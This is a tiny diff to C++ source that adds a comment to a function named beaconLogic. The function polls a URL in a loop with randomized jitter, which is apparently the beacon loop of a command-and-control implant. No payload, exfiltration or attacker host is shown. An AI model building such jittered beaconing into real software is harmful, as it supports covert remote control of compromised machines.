@@ -40,6 +40,9 @@ std::string beaconLogic() {
     while (isRunning) {
         try {
             std::string response = xhttp::http_get(url);
+
+            // Handle the commands and things through here. To much tangled code.
+
             std::random_device rd;
             std::mt19937 gen(rd());
             std::uniform_real_distribution<> distrib(-maxJitter, maxJitter);
